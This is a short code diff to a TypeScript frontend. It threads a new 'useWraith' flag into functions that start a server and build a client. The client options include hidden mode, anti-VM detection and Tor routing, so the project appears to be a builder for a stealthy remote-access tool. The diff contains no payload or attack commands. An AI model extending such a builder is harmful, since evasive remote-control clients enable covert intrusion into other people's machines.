@@ -7,8 +7,8 @@ import {
   OnionServiceInfo,
 } from "../../types";
 
-export const startServerCmd = async (port: string): Promise<string> => {
-  return invoke("start_server", { port });
+export const startServerCmd = async (port: string, useWraith: boolean): Promise<string> => {
+  return invoke("start_server", { port, useWraith });
 };
 
 export const stopServerCmd = async (): Promise<string> => {
@@ -31,7 +31,8 @@ export const buildClientCmd = async (
   enableHidden: boolean,
   antiVmDetection: boolean,
   useTor: boolean,
-  torAddress: string
+  torAddress: string,
+  useWraith: boolean
 ): Promise<void> => {
   return invoke("build_client", {
     ip,
@@ -50,6 +51,7 @@ export const buildClientCmd = async (
     antiVmDetection,
     useTor,
     torAddress,
+    useWraith,
   });
 };
 
